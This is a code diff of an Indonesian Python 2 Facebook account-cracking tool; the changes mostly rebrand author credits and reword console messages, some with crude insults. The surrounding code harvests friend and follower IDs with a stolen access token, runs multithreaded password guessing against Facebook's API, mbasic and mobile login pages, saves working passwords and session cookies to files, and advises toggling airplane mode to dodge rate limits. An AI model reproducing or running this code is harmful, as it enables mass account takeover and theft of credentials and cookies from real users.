@@ -92,7 +92,7 @@ def tod():
 logo = ''' \033[0;96m __  __        __  ______  ____
  \033[0;96m \ \/ / ____  /  |/  / _ )/ __/ ®\033[0m|•| Created By Aang-XD
  \033[0;96m  \  / /___/ / /|_/ / _  / _/    \033[0m|•| Github.com/AngCyber
- \033[0;96m  /_/       /_/  /_/____/_/\033[0;91mv2.0  \033[0m|•| Facebook.com/clubfunbike'''
+ \033[0;96m  /_/       /_/  /_/____/_/\033[0;91mv2.0  \033[0m|•| Facebook.com/Saya Aang'''
 
 lo_ngentod = '1714009362122228'
 # crack selesai
@@ -108,7 +108,7 @@ def hasil(ok,cp):
 def yayanxd():
     os.system('clear')
     print (' %s(*)%s tools ini menggunakan login token facebook!!.\n %s(*)%s apakah kamu sudah tau cara mendapatkan token facebook?\n %s(*)%s ketik %s(OPEN)%s untuk mendapatkan token facebook.'%(O,N,O,N,O,N,H,N))
-    kontol = raw_input('\n %s[%s?%s] Masukkan Token :%s '%(N,M,N,H))
+    kontol = raw_input('\n %s[%s?%s] Masukan Token :%s '%(N,M,N,H))
     if kontol in ('open', 'Open', 'OPEN'):
         print '\n%s (*)%s NOTE!!: usahakan pakai akun tumbal login di google chrome terlebih dahulu'%(B,N);time.sleep(2)
         print '%s (*)%s jangan lupa!! url ubah ke %shttps://m.facebook.com'%(B,N,H);time.sleep(2)
@@ -120,7 +120,7 @@ def yayanxd():
     try:
         nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(kontol)).json()['name']
         print '\n\n %s*%s Selamat datang --> %s%s%s'%(O,N,K,nama,N);time.sleep(2)
-        print ' %s*%s mohon untuk menggunakan script ini sewajarnya saja, admin tidak bertanggung jawab jika script ini disalah gunakan!!'%(O,N);time.sleep(2)
+        print ' %s*%s mohon untuk menggunakan script ini sewajarnya saja,  admin tidak bertanggung jawab jika script ini disalah gunakan!!'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
         raw_input(' %s*%s TEKAN ENTER SAYANG!! '%(O,N));wuhan(kontol)
         os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
@@ -279,7 +279,7 @@ def publik(kontol):
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Sabar Kentod Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -308,7 +308,7 @@ def followers(kontol):
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Sabar Kentod Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -337,7 +337,7 @@ def followers(kontol):
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Sabar Kentod Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -366,7 +366,7 @@ def postingan(kontol):
             id.append(a['id'] + '<=>' + a['name'])
             ys.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
-            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
+            sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Sabar Kentod Sedang Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
@@ -511,7 +511,7 @@ def cek_ingfo(kontol):
         month = '%s-%s'%(M,N)
         day = '%s-%s'%(M,N)
     except:pass
-    print ' [*] terakhir di updated pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
+    print ' [*] terakhir di update pada tanggal %s bulan %s tahun %s jam %s'%(day, month, year, jam);time.sleep(0.03)
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m'
     jalan('\n [%s✓%s] berhasil mengechek data² akun facebook\n\n'%(O,N));exit()
 
@@ -520,11 +520,11 @@ def info_tools():
     os.system('clear')
     print ' %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
     print '\n %s[%s>%s] Yt       : Yayan XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Author   : Moch Yayan Juan Alvredo XD.'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Github   : https://github.com/Yayan-XD'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Facebook : https://www.facebook.com/KM39453'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Yayanxyz'%(N,H,N);time.sleep(0.07)
-    print '\n %s[%s>%s] Instagram: https://www.instagram.com/yayanxd_'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Author   : Aang Ardiansyah-XD.'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Github   : https://github.com/AngCyber'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Facebook : https://www.facebook.com/clubfunbike'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Fanspage : https://www.facebook.com/Saya Aang'%(N,H,N);time.sleep(0.07)
+    print '\n %s[%s>%s] Instagram: https://www.instagram.com/Aang-XD'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s>%s] Blogspot : https://squadcyberpeopleteam.blogspot.com'%(N,H,N);time.sleep(0.07)
     print '\n %s[%s#%s]'%(N,O,N), 52 * '\x1b[1;96m-\x1b[0m';time.sleep(0.07)
     raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
@@ -586,7 +586,7 @@ class __crack__:
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
                 pwek = raw_input('\n [%s?%s] masukan kata sandi : '%(O,N))
-                print ' [*] crack dengan sandi -> [ %s%s%s ]' % (M, pwek, N)
+                print ' [*] crack dengan kata sandi -> [ %s%s%s ]' % (M, pwek, N)
                 if pwek == '':
                     print '\n %s[%s×%s] jangan kosong bro kata sandi nya'%(N,M,N)
                 elif len(pwek)<=5:
@@ -597,9 +597,9 @@ class __crack__:
                         if cin == '':
                             print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__yan__()
                         elif cin == '1':
-                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -610,9 +610,9 @@ class __crack__:
                             os.remove(self.apk)
                             hasil(ok,cp)
                         elif cin == '2':
-                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -623,9 +623,9 @@ class __crack__:
                             os.remove(self.apk)
                             hasil(ok,cp)
                         elif cin == '3':
-                            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-                            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+                            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+                            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
@@ -638,16 +638,16 @@ class __crack__:
                         else:
                             print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                     print '\n [ pilih method login - silahkan coba satu² ]\n'
-                    print ' [%s1%s]. method API (fast)'%(O,N)
-                    print ' [%s2%s]. method mbasic (slow)'%(O,N)
-                    print ' [%s3%s]. method mobile (super slow)'%(O,N)
+                    print ' [%s1%s]. method API (cepat)'%(O,N)
+                    print ' [%s2%s]. method mbasic (lambat)'%(O,N)
+                    print ' [%s3%s]. method mobile (sangat lambat)'%(O,N)
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
             print '\n [ pilih method login - silahkan coba satu² ]\n'
-            print ' [%s1%s]. method API (fast)'%(O,N)
-            print ' [%s2%s]. method mbasic (slow)'%(O,N)
-            print ' [%s3%s]. method mobile (super slow)'%(O,N)
+            print ' [%s1%s]. method API (cepat)'%(O,N)
+            print ' [%s2%s]. method mbasic (lambat)'%(O,N)
+            print ' [%s3%s]. method mobile (sangat lambat)'%(O,N)
             self.__pler__()
         else:
             print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
@@ -655,7 +655,7 @@ class __crack__:
 
     def __api__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s*%s] [crack sedang berjalan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -675,7 +675,7 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
+                print '\r  %s[ --> ] %s|%s                 %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -687,7 +687,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[ --> ] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -699,7 +699,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                print '\r  %s[ --> ] %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -710,7 +710,7 @@ class __crack__:
 
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s*%s] [crack sedang berjalan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -726,7 +726,7 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                print '\r  %s[ --> ] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -738,7 +738,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[ --> ] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -750,7 +750,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                print '\r  %s[ --> ] %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -761,7 +761,7 @@ class __crack__:
 
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s*%s] [crack sedang berjalan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -777,7 +777,7 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                print '\r  %s[ --> ] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -789,7 +789,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[ --> ] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -801,7 +801,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
+                print '\r  %s[ --> ] %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -815,9 +815,9 @@ class __crack__:
         if yan == '':
             print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
         elif yan in ('1', '01'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -834,9 +834,9 @@ class __crack__:
             os.remove(self.apk)
             hasil(ok,cp)
         elif yan in ('2', '02'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -853,9 +853,9 @@ class __crack__:
             os.remove(self.apk)
             hasil(ok,cp)
         elif yan in ('3', '03'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
+            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s•%s] jika tidak ada hasil nyalakan mode pesawat (5 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
@@ -873,7 +873,7 @@ class __crack__:
             hasil(ok,cp)
 
         else:
-            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()
+            print '\n %s[%s×%s] input yang bener bangsat!!'%(N,M,N);self.__pler__()
 
 if __name__ == '__main__':
     os.system('git pull')
